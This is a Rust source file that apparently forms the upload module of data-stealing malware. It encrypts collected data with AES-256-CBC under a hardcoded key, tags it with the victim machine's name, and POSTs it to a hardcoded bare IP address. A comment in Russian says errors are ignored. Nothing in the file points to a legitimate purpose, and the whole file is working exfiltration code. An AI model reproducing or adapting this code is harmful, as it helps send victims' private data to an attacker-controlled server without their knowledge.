use reqwest::blocking::Client;
use reqwest::header::{HeaderMap, HeaderValue};
use serde::Serialize;
use std::collections::HashMap;
use aes::Aes256;
use block_modes::{Cbc, BlockMode};
use block_modes::block_padding::Pkcs7;
use rand::Rng;
use rand::thread_rng;
use serde_json;


#[derive(Serialize)]
struct EncryptedData {
    big_bit: HashMap<String, HashMap<String, Option<String>>>,
    low_bit: HashMap<String, HashMap<String, Option<String>>>,
}

#[derive(Serialize)]
struct RequestBody {
    computer_name: String,
    encrypted_data: Vec<u8>
}

fn crypto(data: EncryptedData) -> Vec<u8> {
    let key: &[u8; 32] = b"WiNrmZMISbgmQROi3TncqGGFxbrFkwar";
    let mut rng = thread_rng();
    let mut iv = [0u8; 16];
    rng.fill(&mut iv);

    let json_data = serde_json::to_vec(&data).unwrap();
    
    let cipher = Cbc::<Aes256, Pkcs7>::new_from_slices(key, &iv).unwrap();

    let encrypted_data = cipher.encrypt_vec(&json_data);

    let mut result = iv.to_vec();
    result.extend(encrypted_data);
    result
}

pub fn req(
    big_bit: HashMap<String, HashMap<String, Option<String>>>, 
    low_bit: HashMap<String, HashMap<String, Option<String>>>, 
    token: String, 
    computer_name: String
) -> () {
    let client = Client::new();

    let encrypt_data = EncryptedData {
        big_bit,
        low_bit
    };

    let encrypted_data = crypto(encrypt_data);

    let body = RequestBody {
        computer_name,
        encrypted_data
    };

    let body_json = serde_json::to_string(&body).unwrap();

    let mut headers = HeaderMap::new();
    headers.insert("X-ZAP-API-Key", HeaderValue::from_str(&token).unwrap());

    let response = client
        .post("http://109.176.30.151:8000/apps/upload")
        .headers(headers)
        .body(body_json)
        .send()
        .unwrap(); // Игнорируем ошибки
}